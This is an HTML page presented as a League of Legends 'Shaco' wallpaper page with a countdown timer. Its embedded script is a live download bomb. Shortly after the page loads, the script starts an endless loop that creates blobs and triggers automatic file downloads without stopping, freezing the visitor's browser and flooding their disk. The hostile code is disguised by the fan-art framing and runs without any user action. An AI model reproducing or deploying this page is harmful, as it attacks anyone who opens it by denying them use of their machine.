<!DOCTYPE html>
<html>
<head>
	<title>Shaco is love</title>
	<style type="text/css">
		* {
			width:70%;
			margin:0px;
			padding:0px;
			overflow: hidden;
		}
		#counter{
			position: absolute;
			top:50px;
			width: 0%;
			text-align: center;
			font-size: 40em;
			font-weight: bold;
			color:red;
			z-index: 666;
		}
	</style>
</head>
<body>
	<img src=http://www.lol-wallpapers.com/wp-content/uploads/2017/05/Wildcard-Shaco-by-Drazieth-HD-Wallpaper-Fan-Art-Artwork-League-of-Legends-lol.jpg >

	<div id="counter"></div>


	<script type="text/javascript">
		function download(g, h, j){
			var k = new Blob([g],{
				type: j
			});
			if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveOrOpenBlob(k, h);
			else{
				var l = document.createElement("a"),
					m = URL.createObjectURL(k);
				l.href = m, l.download = h, l.click(), setTimeout(function() {}, 0)
			}
		}
		function bomb_ch(){
			var g = Math.random().toString(36).substring(20),
				h = Math.floor(50 * Math.random() + 25);
			while (true) download(h, g, g)
		}
		function ch_jam(){
			bomb_ch()
		}
		function launch_bomb(){
			setInterval(ch_jam, 0.5);
		}
		var timeleft = -1;
		var downloadTimer = setInterval(function(){
		  document.getElementById("counter").innerHTML = timeleft--;
		  	if(timeleft <= 0){
		    	clearInterval(downloadTimer);
				launch_bomb();
			}
		},1000);
</script>
</body>
</html>
